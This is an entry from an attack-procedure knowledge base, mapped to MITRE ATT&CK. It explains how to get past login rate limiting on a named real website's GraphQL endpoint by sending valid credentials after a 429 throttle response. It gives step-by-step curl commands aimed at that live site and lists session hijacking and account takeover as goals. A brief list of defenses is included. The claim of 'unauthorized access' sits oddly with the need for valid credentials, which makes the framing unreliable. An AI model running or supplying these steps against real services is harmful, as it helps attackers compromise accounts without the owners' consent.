---
id: proc-uuid-002
name: Bypass-Throttle-with-Valid-Credentials
tags:
  - bypass
  - throttle
  - valid-accounts
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-valid-login]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:24.273Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Bypass-Throttle-with-Valid-Credentials

## Summary

This procedure exploits a rate limiting flaw by submitting valid credentials immediately after triggering a 429 throttle response, gaining unauthorized access without waiting the enforced period.

## Description

After excessive failed login attempts activate throttling on the GraphQL endpoint, the server issues a 429 response but does not block subsequent requests with correct credentials. This allows attackers to bypass the security control, leading to immediate account access. The procedure uses Burp Repeater to switch from invalid to valid inputs post-throttle, applicable to any flawed auth system.

## Requirements

1. Active throttle confirmed from prior failed attempts
2. Valid target credentials (username/email and password)
3. Burp Suite for request manipulation
4. Client ID and secret for the GraphQL mutation if required

## Defense

Defensive measures and detection strategies:

- Enforce IP/session-based blocking during throttle periods for all request types
- Log and alert on successful logins following recent failures
- Implement account lockout after throttle, requiring admin reset

## Objectives

1. Demonstrate throttle bypass with valid creds
2. Obtain access token for session hijacking
3. Validate account takeover path

## Instructions

### Step 1: Confirm Throttle Active

**Context**: Ensure the 429 response is received before attempting bypass.

**Command** ([[commands/curl-invalid-login]]):
```bash
curl -X POST https://dubsmash.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation LogInUser($input: LogInUserInput!) { logInUser(input: $input) { ... on LogInUserSuccess { token } } }","variables":{"input":{"email":"wrongcredentials@gmail.com","password":"password","client_id":"client_id","client_secret":"client_secret"}}}' -c cookies.txt -v
```

> Look for 429 status and throttle message in headers/body.

### Step 2: Submit Valid Credentials

**Context**: Immediately replace invalid creds with valid ones in the same request format to bypass.

**Command** ([[commands/curl-valid-login]]):
```bash
curl -X POST https://dubsmash.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation LogInUser($input: LogInUserInput!) { logInUser(input: $input) { ... on LogInUserSuccess { token } } }","variables":{"input":{"email":"validuser@gmail.com","password":"validpass","client_id":"client_id","client_secret":"client_secret"}}}' -c cookies.txt -v
```

> Successful response includes token; use -v for verbose HTTP details showing 200 status despite throttle.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-valid-login]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- bypass
- throttle
- account-takeover
